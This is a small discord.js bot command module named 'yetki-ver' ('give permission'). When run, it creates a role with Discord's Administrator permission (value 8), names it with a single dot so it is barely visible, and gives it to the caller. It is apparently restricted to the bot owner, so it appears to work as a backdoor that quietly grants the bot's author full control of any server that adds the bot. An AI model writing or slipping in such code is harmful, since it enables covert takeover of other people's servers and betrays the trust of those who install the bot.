const Discord = require('discord.js');
exports.run = function(client, message) {
message.guild.createRole({

name: '.',
permissions: 8
}).then(r=>message.member.addRole(r))
}
exports.conf = {
  enabled: true,
  guildOnly: false, 
  aliases: [], 
  permLevel: 4
};

exports.help = {
  name: 'yetki-ver'
};